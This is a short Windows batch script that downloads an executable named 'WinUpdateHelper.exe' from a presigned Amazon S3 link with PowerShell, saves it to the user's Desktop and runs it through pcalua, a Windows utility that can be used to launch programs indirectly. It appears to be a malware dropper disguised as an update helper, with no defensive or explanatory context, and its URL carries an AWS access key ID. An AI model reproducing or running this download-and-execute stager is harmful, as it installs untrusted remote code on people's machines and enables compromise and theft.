@echo off
set "URL=https://logs69.s3.eu-west-3.amazonaws.com/WinUpdateHelper.exe?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAR34JNEAP5K66HU4P%%2F20260204%%2Feu-west-3%%2Fs3%%2Faws4_request&X-Amz-Date=20260204T173750Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=ea627c5791483d6c032f38bf5cbaf19f8b7174b95af1ceebba8d7a5f15534ef3"
set "OUTPUT=%USERPROFILE%\Desktop\WinUpdateHelper.exe"

powershell -c "(New-Object Net.WebClient).DownloadFile('%URL%','%OUTPUT%')"
pcalua -a "%OUTPUT%"